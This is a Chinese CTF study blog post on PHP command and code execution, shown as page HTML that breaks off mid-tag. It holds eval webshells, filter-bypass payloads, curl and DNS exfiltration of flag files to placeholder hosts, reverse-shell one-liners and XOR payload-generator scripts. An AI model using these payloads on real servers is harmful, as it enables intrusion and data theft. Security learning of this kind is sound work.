<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web_2_PHP命令执行+代码执行 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!0},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web_2_PHP命令执行+代码执行</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-09-07 00:00:00</span> <span class="mobile">2022-09-07 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-09 16:38:46</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/PHP/">PHP</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>2.6k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>11 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h2 id="第一节-php的基础知识"><a href="#第一节-php的基础知识" class="headerlink" title="第一节 php的基础知识"></a>第一节 php的基础知识</h2><h3 id="0x1-php的基本概念"><a href="#0x1-php的基本概念" class="headerlink" title="0x1 php的基本概念"></a>0x1 php的基本概念</h3><p>php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。</p><h3 id="0x2-php环境的安装"><a href="#0x2-php环境的安装" class="headerlink" title="0x2 php环境的安装"></a>0x2 php环境的安装</h3><h4 id="php-的运行环境"><a href="#php-的运行环境" class="headerlink" title="php 的运行环境"></a>php 的运行环境</h4><p>phpstudy</p><h4 id="php-的开发环境"><a href="#php-的开发环境" class="headerlink" title="php 的开发环境"></a>php 的开发环境</h4><p>? 区分文件和参数部分</p><p>参数部分 用 &amp; 区分 多个键值对</p><p>单个键值对用 = 分开</p><h3 id="0x3-php写一个hello-world"><a href="#0x3-php写一个hello-world" class="headerlink" title="0x3 php写一个hello world"></a>0x3 php写一个hello world</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x3-php基础语法"><a href="#0x3-php基础语法" class="headerlink" title="0x3 php基础语法"></a>0x3 php基础语法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当get和post函数被禁用时，可以使用request函数</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">add</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第二节-php的命令执行"><a href="#第二节-php的命令执行" class="headerlink" title="第二节 php的命令执行"></a>第二节 php的命令执行</h2><h3 id="0x1-什么是命令执行"><a href="#0x1-什么是命令执行" class="headerlink" title="0x1 什么是命令执行"></a>0x1 什么是命令执行</h3><p>RCE</p><h3 id="0x2-php的command-exec函数"><a href="#0x2-php的command-exec函数" class="headerlink" title="0x2 php的command exec函数"></a>0x2 php的command exec函数</h3><p>PHP官方有下面六种函数可以执行系统命令</p><ul><li>system</li><li>passthru</li><li>exec</li><li>shell_exec</li><li>popen</li><li>pcntl_exec4</li><li>执行运算符</li><li>echo ``?&gt;</li></ul><h3 id="0x3-php的命令执行利用"><a href="#0x3-php的命令执行利用" class="headerlink" title="0x3 php的命令执行利用"></a>0x3 php的命令执行利用</h3><p>php的命令执行，我们默认讨论的是服务器系统为Linux</p><p>shell 的<code>分号 ;</code> 可以用来分割两条命令</p><p>并列命令&amp;&amp;的url编码(%26%26) 也可以分割两条命令 but &amp;&amp;前的命令成功执行，后面的才会成立</p><p>|| 表示或 ， 可以分割两条命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//不显示报错</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">//代码高亮</span></span><br></pre></td></tr></table></figure><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h5><p>如果 flag/cat 等命令被过滤，可以使用正则、其他未被过滤命令、base64编码解码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo dGFjIGZsYWcucGhw | base64 -d`</span><br></pre></td></tr></table></figure><blockquote><p>在linux当中反引号也十分常用，也就是 ` 符号。那么反引号是怎么使用的呢？我的理解是凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出</p></blockquote><h5 id="变量拼接绕过关键字"><a href="#变量拼接绕过关键字" class="headerlink" title="变量拼接绕过关键字"></a>变量拼接绕过关键字</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure><h5 id="爆破被过滤的符号"><a href="#爆破被过滤的符号" class="headerlink" title="爆破被过滤的符号"></a>爆破被过滤的符号</h5><p>符号被过滤可以爆破一下，</p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png" alt="image-20220903213502790" style="zoom:67%"><p>可以使用{}和冒号: 截取空格</p><p>使用env浏览环境变量，然后截取</p><p>例如<code>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D</code></p><p><code>cmd=tac$&#123;GPG_KEYS:40:1&#125;*</code></p><h4 id="不回显"><a href="#不回显" class="headerlink" title="不回显"></a>不回显</h4><p>没办法直接看到回显，可以使用写文件的方式，将结果写到浏览器可以读取的位置，然后访问url+1.txt</p><h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>可以用 <code>&gt;</code> 写入</p><h5 id="dns通道"><a href="#dns通道" class="headerlink" title="dns通道"></a>dns通道</h5><p><a class="link" target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/<i class="fas fa-external-link-alt"></i></a></p><p>当文件过长无法全部回带时，可以部分回带，使用sed -n命令</p><p>可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #a中，从0开始截取10个，然后从10再截取，依此类推</span><br></pre></td></tr></table></figure><p>当dnslog被过滤时，可以使用</p><p><a class="link" target="_blank" rel="noopener" href="https://requestrepo.com/#/">https://requestrepo.com/#/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" target="_blank" rel="noopener" href="https://pipedream.com/">https://pipedream.com/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POST</span><br><span class="line">curl http://xxx.com/?a=`whoami` #GET</span><br></pre></td></tr></table></figure><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>以及ctfshow专用反弹shell<a class="link" target="_blank" rel="noopener" href="https://your-shell.com/">https://your-shell.com/<i class="fas fa-external-link-alt"></i></a></p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>盲注猜flag</p><h2 id="第三节-php的代码执行"><a href="#第三节-php的代码执行" class="headerlink" title="第三节 php的代码执行"></a>第三节 php的代码执行</h2><h3 id="0x1-什么是php的代码执行"><a href="#0x1-什么是php的代码执行" class="headerlink" title="0x1 什么是php的代码执行"></a>0x1 什么是php的代码执行</h3><p><code>eval(&quot;要执行的代码&quot;);</code> 可以执行参数给的php代码</p><p>可以用?&gt;结束php代码。</p><h3 id="0x2-代码执行和命令执行的区别"><a href="#0x2-代码执行和命令执行的区别" class="headerlink" title="0x2 代码执行和命令执行的区别"></a>0x2 代码执行和命令执行的区别</h3><ul><li><input checked disabled type="checkbox"> system 命令执行</li><li><input checked disabled type="checkbox"> shell_exec 命令执行</li><li><input checked disabled type="checkbox"> eval 代码执行</li></ul><h3 id="0x3-php的代码执行是什么格式"><a href="#0x3-php的代码执行是什么格式" class="headerlink" title="0x3 php的代码执行是什么格式"></a>0x3 php的代码执行是什么格式</h3><p>在php语言中，代码分为三种</p><p>1.函数调用</p><p>函数名 (函数参数1，函数参数2 …);</p><p>2.类方法调用</p><p>类实例 箭头 类方法 ()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]); <span class="comment">//免杀一句话木马</span></span><br></pre></td></tr></table></figure><p>3.语言结构调用</p><h3 id="0x4-php的代码执行后门"><a href="#0x4-php的代码执行后门" class="headerlink" title="0x4 php的代码执行后门"></a>0x4 php的代码执行后门</h3><p>一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//蚁剑连接</span></span><br></pre></td></tr></table></figure><p>get转post转接头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?<span class="number">1</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><h3 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h3><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p><p><code>(&quot;sys&quot;.&quot;tem&quot;)=system</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>php5.6版本以前的可用</p><p>最短木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>`<span class="variable">$_GET</span>[<span class="number">2</span>]`;&amp;<span class="number">2</span>=</span><br></pre></td></tr></table></figure><p>反弹 shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e /bin/sh #传统姿势</span><br><span class="line">curl https://your-shell.com/ip:port |sh #ctfshow新姿势</span><br></pre></td></tr></table></figure><h2 id="烧姿势"><a href="#烧姿势" class="headerlink" title="烧姿势"></a>烧姿势</h2><h4 id="1-无字母数字命令执行"><a href="#1-无字母数字命令执行" class="headerlink" title="1.无字母数字命令执行"></a>1.无字母数字命令执行</h4><p>采用文件上传的方式，匹配到temp目录下的文件，在该文件中写入命令执行代码</p><p>这里搬用一下ctfshow师傅写的upload代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://靶场地址/?cmd=. /???/????????[@-[]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>匹配临时文件，写入命令，实现命令执行</p><p>这里开一个靶场写一下详细过程</p><p>这里我们把upload.html挂到PHP study</p><p>然后随便传一个.txt</p><p>打开bp，开抓</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071106066.png" alt="image-20220907110602945"></p><p>我们发到repeater</p><p>然后把我们1.txt文件中的内容改成要执行的命令，发包!</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071111453.png" alt="image-20220907111148387"></p><p>成功，如果不成功可以多发几次，因为我们匹配的文件名是未知的，能否正确匹配也是概率事件，多发几次就会成功。</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071114216.png" alt="image-20220907111400146"></p><h4 id="2-无字母数字代码执行"><a href="#2-无字母数字代码执行" class="headerlink" title="2.无字母数字代码执行"></a>2.无字母数字代码执行</h4><p>这里我们有两个脚本</p><p>作者都来自羽师傅</p><p>首先是一个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                                        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们把他挂在PHP study，会在本地生成一个<code>xor_rce.txt</code></p><p>然后是一个python脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们跑一下，在<code>function：</code>和<code>command：</code>下分别填入我们想要执行的命令</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071133034.png" alt="image-20220907113334808"></p><p>然后就会生成一串异或出来的命令，复制执行即可</p><p>这里的<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);</code></p><p>虽然看上去存在一些数字字母，但是都是url编码后的，我们可以解码看一下</p><img lazyload alt="image" 